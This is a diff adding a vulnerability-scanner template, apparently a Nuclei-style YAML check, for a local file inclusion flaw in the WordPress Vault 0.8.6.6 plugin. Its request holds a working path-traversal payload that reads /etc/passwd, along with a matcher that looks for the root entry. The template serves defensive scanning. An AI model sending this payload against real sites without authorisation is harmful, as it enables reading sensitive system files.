@@ -1,0 +1,30 @@
+id: "wp-vault-local-file-inclusion"
+name: "WordPress Vault 0.8.6.6 - Local File Inclusion"
+severity: "high"
+description: "WordPress Vault 0.8.6.6 is vulnerable to local file inclusion."
+tech:
+  - "wordpress"
+tags:
+  - "lfi"
+  - "edb"
+  - "wp-plugin"
+  - "wordpress"
+  - "vuln"
+cwe: "CWE-22"
+reference: "https://www.exploit-db.com/exploits/40850"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/?wpv-image=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "regex"
+    part: "body"
+    regex:
+      - "root:.*:0:0:"
+  - type: "status"
+    status:
+      - 200
